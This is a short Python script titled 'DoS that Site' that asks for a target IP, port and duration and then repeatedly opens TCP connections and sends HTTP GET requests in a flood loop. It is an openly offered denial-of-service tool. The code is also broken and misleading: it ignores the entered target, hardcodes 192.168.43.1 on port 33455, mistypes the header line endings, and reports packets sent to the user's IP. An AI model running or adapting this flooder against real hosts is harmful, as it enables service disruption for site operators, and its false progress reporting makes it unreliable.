import os
import sys
import time
import socket
import random

print("DoS that Site")
print("")

ip = input("Target IP: ")
port = input("Port: ")
duration = input("Duration (in seconds): ")
timeout = time.time() + float(duration)
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("192.168.43.1",33455))
        sock.send(b"GET /300 HTTP/1.1\r\n")
        sock.send(b"HOST: 192.168.43.1 /r/n/r/n")
        sock.close()
        sent = sent + 1
        print("Sent %s packets to %s through port %s"%(sent, ip, port))
    except KeyboardInterrupt:
        sys.exit()

input("Done.")
